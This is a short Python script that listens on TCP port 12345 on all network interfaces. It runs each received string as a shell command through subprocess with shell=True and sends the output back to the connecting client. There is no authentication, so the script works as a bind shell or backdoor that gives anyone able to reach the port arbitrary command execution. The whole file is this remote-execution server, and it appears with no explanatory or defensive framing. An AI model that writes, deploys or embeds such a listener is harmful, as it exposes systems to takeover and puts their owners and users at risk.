import socket
import subprocess
import os

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output

def start_server(host='0.0.0.0', port=12345):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"Server started on {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        command = client_socket.recv(1024).decode()
        print(f"Received command: {command}")

        output = execute_command(command)
        client_socket.sendall(output.encode())

        client_socket.close()
        print(f"Done.")

if __name__ == "__main__":
    start_server()
